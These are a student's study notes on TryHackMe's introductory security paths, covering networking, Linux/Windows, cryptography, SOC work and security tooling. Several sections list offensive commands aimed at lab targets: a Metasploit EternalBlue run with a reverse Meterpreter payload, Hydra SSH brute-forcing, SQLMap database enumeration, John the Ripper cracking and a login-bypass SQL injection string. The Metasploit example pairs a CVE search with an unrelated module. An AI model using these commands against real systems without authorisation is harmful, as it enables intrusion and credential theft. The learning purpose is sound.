# Week 09 Notes — TryHackMe: Pre Security Path + Cyber Security 101 Path

---

# Part 1 — Pre Security Path

## 1. Introduction to Offensive Security

### Definition
The practice of simulating a hacker's actions to identify and exploit vulnerabilities in a system or network, done to understand adversarial tactics and ultimately improve defenses.

### Key Concepts
```
Offensive Security  → thinking like an attacker to find flaws before real attackers do
Ethical Hacking      → offensive security performed legally, with authorization, findings reported back
Virtual Machines      → isolated sandbox environments used to practice safely (TryHackMe's core delivery model)
Web Directory Brute-Forcing → automated discovery of hidden files/directories using a wordlist
```

### Practical Application
```bash
# Gobuster directory brute-force
# -u target URL, -w wordlist path, dir = directory/file mode
gobuster -u http://fakebank.thm -w wordlist.txt dir
```

### Why It Matters for Cybersecurity
- Reconnaissance tools like Gobuster are how attackers (and pentesters) find admin panels or endpoints that were never meant to be public.
- Human error — like leaving an unlinked admin portal reachable — is a recurring, entirely preventable root cause of real breaches.

### Key Takeaway
> Offensive security isn't about being destructive — it's about finding the door before someone with worse intentions does.
> Every offensive technique exists to make a defensive control better.

---

## 2. Introduction to Defensive Security

### Key Concepts
```
Defensive Security  → preventing, detecting, and responding to attacks
Core Tasks            → security awareness training, asset management, patching, deploying preventative tech
SOC                     → centralized team continuously monitoring posture and responding to incidents
Threat Intelligence      → gathering/analyzing adversary TTPs to build a threat-informed defense
DFIR                       → Digital Forensics (investigating evidence) + Incident Response (structured handling)
Malware Analysis              → Static (no execution, code review) vs Dynamic (sandboxed execution, behavior observation)
```

### Why It Matters for Cybersecurity
- Defensive security is two-pronged: stop what you can, and respond fast to what you can't.
- A SOC without threat intelligence is reactive; a SOC with it is proactive.

### Key Takeaway
> Offense finds the gap once. Defense has to close every gap, every day.
> That asymmetry is why defensive tooling (SIEM, playbooks, DFIR process) matters as much as raw vigilance.

---

## 3. Careers in Cyber Security

### Role Map
| Role | Focus |
|---|---|
| Penetration Tester | Authorized testing to find exploitable vulnerabilities |
| Red Teamer | Simulates a real adversary to test detection/response |
| Security Engineer | Designs and maintains security infrastructure |
| Security Analyst | Monitors, analyzes, and responds to incidents (SOC) |
| Incident Responder | Contains and restores service during active breaches |
| Digital Forensics Examiner | Collects/analyzes evidence post-incident |
| Malware Analyst | Reverse-engineers malicious software |

### Why It Matters for Cybersecurity
- Over 3.5 million unfilled cyber roles globally — this field rewards continuous, hands-on learning over credentials alone.
- Offensive and defensive roles aren't competing tracks — they inform each other constantly.

### Key Takeaway
> There isn't one "cybersecurity job" — there's a whole ecosystem of specialties.
> Figuring out whether you're drawn to breaking things or defending them is the first real career fork in this field.

---

## 4. Network Fundamentals

### Key Concepts
```
Network        → 2+ connected devices exchanging data/resources
The Internet    → a global network of networks, descended from ARPANET
IP Address       → logical identifier, can change (IPv4: 32-bit, ~4.3B addresses; IPv6: 128-bit)
MAC Address        → physical, generally static hardware identifier (48-bit)
Spoofing              → falsifying an identifier (e.g. forged MAC) to bypass access controls
ICMP / Ping            → protocol/tool for testing reachability via echo-request packets
```

### Why It Matters for Cybersecurity
- Every device needs both a logical (IP) and physical (MAC) identity — attackers spoof either to bypass access controls.
- `ping` is the first diagnostic reflex for "is this even reachable?" before deeper investigation.

### Key Takeaway
> IP tells you *where* on the network; MAC tells you *which physical device*.
> Confusing the two — or trusting either blindly — is exactly what spoofing attacks exploit.

---

## 5. Local Area Networks (LAN)

### Key Concepts
```
Topology     → Star (central hub, scalable, single point of failure) / Bus (shared backbone, cheap, fragile)
               / Ring (circular loop, one break can down the whole segment)
Subnetting    → dividing a large network into smaller, manageable subnets
Switch          → Layer 2 device, connects devices within a LAN using MAC addresses
Router            → Layer 3 device, forwards packets between networks using IP addresses
DHCP                → auto-assigns IPs via Discover → Offer → Request → Acknowledge (DORA)
ARP                   → resolves IP addresses to MAC addresses on the local segment
```

### Why It Matters for Cybersecurity
- Star topology dominates modern LANs — but its central switch/hub is a single high-value target.
- ARP's blind trust model is exactly what ARP poisoning abuses to redirect local traffic.

### Key Takeaway
> A switch connects devices; a router connects networks. Mixing that up misreads every network diagram you'll ever look at during an incident.

---

## 6. The OSI Model

### The Seven Layers
| # | Layer | Responsibility | Example |
|---|---|---|---|
| 7 | Application | User-facing services | HTTP, FTP, DNS |
| 6 | Presentation | Format, encrypt, compress data | TLS |
| 5 | Session | Create/manage/terminate sessions | — |
| 4 | Transport | End-to-end delivery, error checking | TCP, UDP |
| 3 | Network | Routing, logical addressing | IP |
| 2 | Data Link | Node-to-node transfer, physical addressing | MAC, switches |
| 1 | Physical | Raw bit transmission | Cables, signals |

### Why It Matters for Cybersecurity
- Encapsulation (headers added going down, stripped going up) is exactly what you're reading when you open a packet capture.
- Knowing which layer a device/protocol/attack operates at instantly narrows the diagnosis.

### Key Takeaway
> The OSI model is the shared vocabulary of networking. Say "Layer 2 issue" instead of "the network thing is broken" and every network engineer in the room instantly knows where to look.

---

## 7. Packets, Frames, & Ports

### Key Concepts
```
Packet       → Layer 3 unit, carries IP address info
Frame          → Layer 2 unit, packet wrapped with MAC address header/trailer
TCP/IP Model     → practical 4-layer model (Application / Transport / Internet / Network Interface)
Three-Way Handshake → SYN → SYN/ACK → ACK, establishes a reliable TCP connection
UDP                    → connectionless, "fire-and-forget," no delivery guarantee
Ports                    → 0–65535, direct traffic to the correct service on a device
```

### Common Ports
```
FTP 21 | SSH 22 | HTTP 80 | HTTPS 443 | SMB 445 | RDP 3389
```

### Why It Matters for Cybersecurity
- TCP's handshake is what a SYN flood DoS attack abuses — half-open connections exhaust server resources.
- Port knowledge is table stakes for reading an Nmap scan or a firewall rule set.

### Key Takeaway
> Packets carry data between networks; frames carry it across the local wire. Ports decide which application on the destination actually receives it.

---

## 8. Extending Your Network

### Key Concepts
```
Port Forwarding  → NAT application that maps an external router port to an internal IP:port,
                    exposing an internal service to the internet
Firewall           → barrier between trusted/untrusted networks, filters by rule set
  Stateful             → tracks connection context, more secure, more resource-intensive
  Stateless             → filters packets individually by static rule, faster, less intelligent
VPN                     → encrypted tunnel extending a private network across a public one
IPSec                     → protocol suite authenticating/encrypting packets, commonly underlies VPNs
```

### Why It Matters for Cybersecurity
- Port forwarding is convenient and dangerous in the same breath — every forwarded port is a deliberately opened door.
- Stateful firewalls understand *conversations*, not just individual packets — that context is what stops more sophisticated probing.

### Key Takeaway
> Every technique for extending a network outward — port forwarding, VPNs — is also a technique for extending the attack surface outward. Convenience and exposure are the same coin.

---

## 9. How the Web Works

### Key Concepts
```
DNS            → the internet's phonebook; domain name → IP address
DNS Hierarchy    → Root → TLD (.com) → Second-Level (example) → Subdomain (store.example)
Record Types       → A (IPv4) | AAAA (IPv6) | CNAME (alias) | MX (mail) | TXT (verification/SPF)
HTTP(S)               → HTTP = plaintext, HTTPS = TLS-encrypted
HTTP Flow                → Client sends Request → Server sends Response
Methods                     → GET (retrieve), POST (submit), PUT (update), DELETE (remove)
Status Codes                   → 2xx success | 3xx redirect | 4xx client error | 5xx server error
Cookies                           → small stored data, sent with each request to maintain state
                                    (since HTTP itself is stateless)
```

### Why It Matters for Cybersecurity
- DNS record types are frequently abused for spoofing/poisoning — knowing legitimate record behavior is what lets you spot a forged one.
- Cookies carrying session state are exactly what session hijacking attacks steal.

### Key Takeaway
> The web runs on a simple request/response loop — but every piece bolted on to make it *feel* stateful (cookies, sessions) is also a piece an attacker can steal or forge.

---

## 10. Website Fundamentals

### Key Concepts
```
Front End    → HTML (structure) + CSS (style) + JavaScript (interactivity) — rendered client-side
Back End       → server, application logic, database — processes requests server-side
Sensitive Data Exposure → confidential info unintentionally left in front-end source (HTML/CSS/JS comments, keys)
HTML Injection             → unsanitized user input rendered as HTML/JS, letting an attacker alter the page
```

### Why It Matters for Cybersecurity
- Viewing page source is genuinely step one of most web assessments — developers leave more in there than they realize.
- HTML Injection is the entry point that escalates into full Cross-Site Scripting when left unchecked.

### Key Takeaway
> Never trust user input, and always check what the front end is quietly exposing. Both rules exist because developers forget them constantly — not because they're exotic threats.

---

## 11. Web Architecture

### Key Concepts
```
Load Balancer   → distributes traffic across servers, health-checks and reroutes from failing ones
CDN               → geographically distributed cache of static content, speeds up delivery
WAF                 → sits in front of a web app, blocks malicious HTTP traffic (SQLi, XSS)
Web Server            → Apache/Nginx/IIS — listens for HTTP requests, serves from a root directory
Static vs Dynamic       → Static = fixed files served as-is; Dynamic = generated per-request by backend code
Virtual Hosts             → one server hosting multiple domains, differentiated by the Host header
```

### Why It Matters for Cybersecurity
- A WAF is a security layer, not a substitute for secure code — it filters known attack patterns, not logic flaws.
- Dynamic content generation is where most injection vulnerabilities (SQLi, HTML injection) actually live.

### Key Takeaway
> Modern web architecture is a stack of specialized layers (LB, CDN, WAF, app server, DB) — a weakness in any single layer can undermine the ones built to protect it.

---

## 12. Linux Fundamentals

### Key Concepts
```
Terminal / Shell   → CLI for interacting with the OS
Filesystem            → hierarchical structure; /etc (configs), /var/log (logs), /root, /tmp (world-writable)
Permissions             → read (r) / write (w) / execute (x) for user / group / others
Processes                 → each running program has a unique PID
Cron                        → schedules recurring jobs via crontab
apt                            → Debian/Ubuntu package manager
SSH                               → secure protocol for remote Linux access
```

### Core Commands
```bash
ls -la | cd | pwd | cat | grep "error" file | find . -name "*.log"
cp | mv | rm -r | touch | mkdir
ps aux | top | kill 1234
sudo apt update && sudo apt install <pkg>
ssh user@host | scp file user@host:/path
crontab -e
```

### Why It Matters for Cybersecurity
- Most servers and security tooling run on Linux — command-line fluency isn't optional in this field.
- `/tmp` being world-writable and `/var/log` holding evidence are both facts attackers and defenders exploit for opposite reasons.

### Key Takeaway
> Linux fluency is the baseline skill underneath almost every other skill in this field — SSH, log analysis, tool usage, all assume you're comfortable at a shell prompt.

---

## 13. Windows Fundamentals

### Key Concepts
```
NTFS           → modern Windows filesystem; supports permissions, encryption (EFS), journaling
UAC              → prompts for elevation before privileged actions — a core anti-malware guardrail
Admin vs Standard  → account tiers controlling system-wide vs limited access
Task Manager         → process/performance monitoring
Event Viewer            → logs of system/security events — critical for incident investigation
Registry Editor            → hierarchical DB of low-level system settings
Windows Defender + Firewall  → built-in AV and stateful firewall
BitLocker                       → full-disk encryption
```

### Core Commands
```cmd
hostname | whoami | systeminfo
ipconfig /all | netstat -an | net user | net localgroup
taskmgr | eventvwr.msc | lusrmgr.msc | regedit | compmgmt.msc
```

### Why It Matters for Cybersecurity
- UAC is the single biggest speed bump against silent malware privilege escalation on a Windows endpoint.
- Event Viewer is usually the first place a Windows-side incident investigation starts.

### Key Takeaway
> Windows security leans on layered, built-in tooling — UAC, Defender, BitLocker, Event Viewer — each covering a different failure mode. Knowing where each one lives is half the incident-response battle.

---

# Part 2 — Cyber Security 101 Path

## 01. Start Your Cyber Security Journey

### Key Concepts
```
Offensive Security Intro   → attacker mindset, authorized testing, reconnaissance tools (Gobuster)
Defensive Security Intro     → SOC, DFIR, threat intel, malware analysis (static/dynamic)
Search Skills                   → effective use of search engines, docs, and GTFOBins/exploit-db style
                                  research during CTFs — knowing *how* to look something up is a skill in itself
```

### Key Takeaway
> This module is the on-ramp: attacker mindset, defender mindset, and the meta-skill of knowing how to find an answer you don't already have memorized.

---

## 02. Linux Fundamentals (Parts 1–3)

### Progression
```
Part 1  → shell basics, navigation, file viewing (ls, cd, cat, pwd)
Part 2   → file manipulation, permissions, searching (chmod, grep, find), package management
Part 3    → processes, services (systemctl), scripting basics, SSH
```

### Why It Matters for Cybersecurity
- This is the deeper, hands-on companion to the Pre Security Linux Fundamentals room — more practice reps on permissions and process management.

### Key Takeaway
> Repetition on Linux basics compounds fast — the same `grep`/`find`/permission instincts show up in log analysis, privilege escalation, and forensics later.

---

## 03. Windows and AD Fundamentals

### Key Concepts
```
Windows Fundamentals 1-3  → GUI, filesystem (NTFS), user/permission model, system utilities
Active Directory Basics     → centralized directory service for Windows domain environments
  Domain            → logical grouping of users/computers under one authority
  Domain Controller    → server hosting AD, handles authentication (Kerberos/NTLM)
  OU (Organizational Unit) → container for organizing objects and applying Group Policy
  Group Policy (GPO)          → centrally enforced configuration/security settings
```

### Why It Matters for Cybersecurity
- The vast majority of enterprise environments are AD-joined — AD compromise (e.g. via Kerberoasting, misconfigured ACLs) is one of the highest-impact real-world attack paths.
- Understanding domain vs local accounts is essential before touching any AD attack technique later in a career path.

### Key Takeaway
> Standalone Windows security and AD security are related but distinct disciplines — AD adds a centralized trust model, and centralized trust means a single compromise can cascade across an entire domain.

---

## 04. Command Line

### Key Concepts
```
Windows Command Line (cmd.exe)  → legacy shell, dir/copy/ipconfig-style commands
PowerShell                         → modern, object-oriented shell; cmdlets (Verb-Noun syntax),
                                     scripting, remoting (WinRM) — heavily used both defensively and offensively
Linux Shells                          → bash and alternatives (zsh, sh); scripting, piping, redirection
```

### Why It Matters for Cybersecurity
- PowerShell is a double-edged sword: it's a powerful admin tool and also the most common living-off-the-land technique attackers use post-compromise on Windows.
- Comfort across both cmd/PowerShell and bash means you're not blocked no matter which OS an incident lands on.

### Key Takeaway
> The command line — on any OS — is where both administration and compromise actually happen. Logging and monitoring shell activity is a core defensive control for exactly this reason.

---

## 05. Networking

### Key Concepts
```
Networking Concepts/Essentials  → OSI/TCP-IP recap, IP addressing, subnetting, UDP vs TCP, encapsulation
Core Protocols                    → deeper dive into DNS, HTTP, FTP, SMTP behavior
Secure Protocols                     → TLS/SSL, SSH, HTTPS, SFTP — how encryption is layered onto legacy protocols
Wireshark                               → GUI packet capture/analysis, filters (e.g. http, tcp.port==80)
Tcpdump                                    → CLI packet capture, lightweight, scriptable
Nmap                                          → network/port scanner
  -sS (SYN scan) | -sV (version detection) | -A (aggressive) | -p- (all ports)
```

### Practical Application
```bash
# Basic Nmap service/version scan
nmap -sV -sС -p- 10.10.10.10

# Tcpdump capture on interface eth0, write to file
tcpdump -i eth0 -w capture.pcap
```

### Why It Matters for Cybersecurity
- Nmap is usually the very first tool run against any target in both offensive assessments and defensive asset discovery.
- Wireshark/tcpdump turn "something feels wrong on the network" into concrete, provable evidence.

### Key Takeaway
> Networking theory (OSI, TCP/IP) only becomes useful once you can *see* it — Wireshark, tcpdump, and Nmap are how the abstract model becomes an actual, inspectable thing on screen.

---

## 06. Cryptography

### Key Concepts
```
Cryptography Basics       → confidentiality via encoding/encryption; encoding ≠ encryption ≠ hashing
Symmetric Encryption         → same key encrypts/decrypts (AES) — fast, key distribution is the hard problem
Public Key (Asymmetric)         → key pair (public/private); RSA — solves key distribution, slower
Hashing                             → one-way function, fixed-length output, used for integrity (MD5, SHA-256)
John the Ripper                        → offline password-cracking tool (dictionary, brute-force, rule-based)
```

### Practical Application
```bash
# Crack a hash with a wordlist using John the Ripper
john --wordlist=rockyou.txt hash.txt
```

### Why It Matters for Cybersecurity
- Confusing hashing with encryption is one of the most common junior-analyst mistakes — hashes can't be "decrypted," only cracked or brute-forced.
- Weak/reused password hashes (unsalted MD5, etc.) are exactly what tools like John exploit at scale.

### Key Takeaway
> Encryption protects confidentiality and is reversible with a key. Hashing protects integrity and is one-way by design. Mixing up which property you actually need is a real, recurring security design flaw.

---

## 07. Exploitation Basics

### Key Concepts
```
CVE Case Study (Moniker Link, CVE-2024-21413)  → real-world example of a specific, patched Outlook vulnerability;
                                                   shows how a CVE moves from disclosure to exploit to patch
Metasploit Framework                               → modular exploitation framework
  msfconsole    → main interface
  search              → find modules by CVE/service name
  use <module>            → select an exploit/auxiliary module
  set RHOSTS / set PAYLOAD  → configure target and payload
  exploit / run                → launch it
Meterpreter                                            → advanced post-exploitation payload (in-memory, extensible)
```

### Practical Application
```bash
msfconsole
search type:exploit cve:2024-21413
use exploit/windows/smb/ms17_010_eternalblue   # example module pattern
set RHOSTS 10.10.10.10
set PAYLOAD windows/meterpreter/reverse_tcp
run
```

### Why It Matters for Cybersecurity
- Metasploit turns a documented CVE into a repeatable exploitation chain — which is exactly why unpatched systems remain the top real-world entry point.
- The "Blue" room-style scenario (unpatched SMB) is a canonical, still-relevant example of a known vulnerability with no excuse to remain unpatched.

### Key Takeaway
> Exploitation frameworks don't invent new flaws — they operationalize known ones. That's precisely why patch management remains the highest-leverage defensive control against this entire category.

---

## 08. Web Hacking

### Key Concepts
```
Web Application Basics  → client-server model, request/response, common vuln classes overview
JavaScript Essentials     → DOM manipulation, client-side logic — and why client-side checks are never trustworthy
SQL Fundamentals            → SELECT/INSERT/UPDATE/WHERE basics, how queries build from user input
Burp Suite                     → intercepting proxy; Proxy tab captures/modifies requests before they reach the server
```

### Practical Application
```sql
-- Classic SQL injection pattern in a login form
' OR '1'='1' -- 
```

### Why It Matters for Cybersecurity
- Burp Suite's intercept-and-modify workflow is the standard manual testing method for almost every web app assessment.
- Any client-side validation (JS) is a UX nicety, not a security control — the server must re-validate everything.

### Key Takeaway
> The browser is not a trusted execution environment from the server's point of view. Every "basics" room in this module ultimately teaches the same lesson: validate on the server, always.

---

## 09. Offensive Security Tooling

### Key Concepts
```
Hydra       → online brute-force tool for login forms/services (SSH, FTP, HTTP forms)
Gobuster       → directory/DNS/vhost brute-forcing (recap from Pre Security, more depth here)
Shells Overview  → reverse shell vs bind shell; getting interactive command execution on a target
SQLMap             → automated SQL injection detection and exploitation
```

### Practical Application
```bash
# Hydra SSH brute-force
hydra -l admin -P rockyou.txt ssh://10.10.10.10

# SQLMap against a vulnerable parameter
sqlmap -u "http://target.thm/item?id=1" --dbs
```

### Why It Matters for Cybersecurity
- These tools automate what a manual attacker would do slowly — which is exactly why rate-limiting, account lockouts, and WAFs exist as countermeasures.
- Reverse vs bind shells matter operationally: a reverse shell calls out (often bypasses inbound firewall rules), a bind shell listens (needs an open inbound port).

### Key Takeaway
> Offensive tooling is force-multiplication, not new technique invention. Understanding what each tool automates is what lets a defender design the matching control.

---

## 10. Defensive Security

### Key Concepts
```
Defensive Security Intro (recap)  → prevention + detection + response
SOC Fundamentals                     → tiered analyst structure (Tier 1 triage → Tier 2 investigation → Tier 3 hunting)
Digital Forensics Fundamentals          → evidence handling, chain of custody, disk/memory/network artifact sources
Incident Response Fundamentals             → Preparation → Detection & Analysis → Containment →
                                              Eradication & Recovery → Post-Incident Activity
Logs Fundamentals                             → log sources (auth, system, application), why centralization matters
```

### Why It Matters for Cybersecurity
- SOC tiering exists so junior analysts triage the flood of alerts while senior analysts focus on the incidents that actually matter.
- Chain of custody failures can make otherwise solid forensic evidence legally unusable — process matters as much as the finding.

### Key Takeaway
> Defensive security isn't just tools — it's process discipline. A perfect detection is worthless if the response process around it is sloppy or the evidence chain is broken.

---

## 11. Security Solutions

### Key Concepts
```
SIEM                → centralizes and correlates logs, drives alerting (recap + hands-on depth)
Firewall Fundamentals  → stateless vs stateful vs NGFW, rule ordering, implicit deny
IDS Fundamentals         → signature-based vs anomaly-based detection, detect-only (vs IPS which blocks)
Vulnerability Scanners      → automated discovery of known weaknesses (Nessus/OpenVAS-style tools), CVE-mapped output
```

### Why It Matters for Cybersecurity
- IDS vs IPS is a recurring exam and real-world distinction — an IDS alert needs a human to act, an IPS may have already blocked it.
- Vulnerability scanner output is only as useful as the patching process that follows it — scanning without remediation is just documentation of risk.

### Key Takeaway
> These four tool categories (SIEM, firewall, IDS, scanner) form the standard defensive stack — each answers a different question: what happened, what's allowed in, is something actively wrong, and where are we already weak.

---

## 12. Defensive Security Tooling

### Key Concepts
```
CyberChef    → browser-based "cyber Swiss Army knife" for encoding/decoding, hashing, and data transforms
CAPA            → identifies capabilities in a piece of malware/binary via static analysis
REMnux             → Linux distro purpose-built for malware analysis
FlareVM               → Windows equivalent, curated arsenal of reverse-engineering/malware-analysis tools
```

### Why It Matters for Cybersecurity
- CyberChef alone replaces dozens of ad-hoc encode/decode scripts — an essential quick-triage tool for suspicious strings.
- REMnux/FlareVM exist because malware analysis needs a purpose-built, isolated toolset — you don't reverse-engineer malware on your daily driver machine.

### Key Takeaway
> Defensive tooling isn't just detection — a whole category exists purely for safely dissecting what's already gotten through, which is just as critical for learning how to stop the next one.

---

## 13. Build Your Cyber Security Career

### Key Concepts
```
Security Principles  → CIA triad, least privilege, defense in depth — recurring foundational themes
Careers in Cyber        → recap of role map (Analyst, Pentester, Red Teamer, Engineer, DFIR)
Training Impact on Teams  → why continuous security training measurably reduces incident rates
```

### Why It Matters for Cybersecurity
- This module is a deliberate bookend — reinforcing that the foundational principles learned in module 1 apply just as much after 12 modules of hands-on tooling.

### Key Takeaway
> Tools and techniques change constantly; the underlying principles (CIA, least privilege, defense in depth) don't. That's why they get taught first and reinforced last.

---

## 14. OWASP Top 10 (2025)

### Key Concepts
```
IAAA Failures              → Identification, Authentication, Authorization, Accountability breakdowns
                              (broken auth, session flaws, missing access control checks)
Application Design Flaws      → insecure-by-design issues baked in before a single line of code is exploited
                                 (missing threat modeling, insecure defaults, trusting client input)
Insecure Data Handling            → improper storage/transmission/logging of sensitive data
                                     (plaintext secrets, verbose error messages, unencrypted data at rest)
```

### Why It Matters for Cybersecurity
- The 2025 revision shifts emphasis toward design-level and identity-layer failures, reflecting how many real breaches now start with an auth/access-control gap rather than a classic injection bug.
- IAAA failures map directly back to the IAM concepts from the Pre Security path — this is that theory showing up as a named, ranked risk category.

### Key Takeaway
> OWASP's list isn't static because attacks aren't static — the move toward IAAA and design-flaw categories shows the field's current center of gravity: broken trust boundaries, not just broken input filters.

---

## Quick Reference — Week 09 Cheat Sheet

### Pre Security Path (13 rooms)
```
Offensive Security Intro | Defensive Security Intro | Careers in Cyber
Network Fundamentals | LAN | OSI Model | Packets, Frames & Ports
Extending Your Network | How the Web Works | Website Fundamentals | Web Architecture
Linux Fundamentals | Windows Fundamentals
```

### Cyber Security 101 Path (14 modules)
```
01 Start Your Journey | 02 Linux Fundamentals | 03 Windows & AD Fundamentals
04 Command Line | 05 Networking | 06 Cryptography | 07 Exploitation Basics
08 Web Hacking | 09 Offensive Security Tooling | 10 Defensive Security
11 Security Solutions | 12 Defensive Security Tooling
13 Build Your Cyber Security Career | 14 OWASP Top 10 (2025)
```

### Core Tools Introduced This Week
```
Gobuster | Nmap | Wireshark | Tcpdump | John the Ripper | Metasploit/Meterpreter
Hydra | SQLMap | Burp Suite | CyberChef | CAPA | REMnux | FlareVM
```

---

> **Overall Key Takeaway — Week 09:**
> This week closed the loop between *theory* (Pre Security's OSI/TCP-IP model, CIA triad, network devices) and *practice* (Cyber Security 101's actual tools — Nmap, Metasploit, Burp Suite, SIEM, CyberChef).
> Pre Security answered "how does this all work?" Cyber Security 101 answered "what do I actually run to test or defend it?"
> Both offensive tooling (Hydra, SQLMap, Metasploit) and defensive tooling (SIEM, IDS, CyberChef, REMnux) trace back to the same handful of principles: least privilege, defense in depth, and patch what's already known.
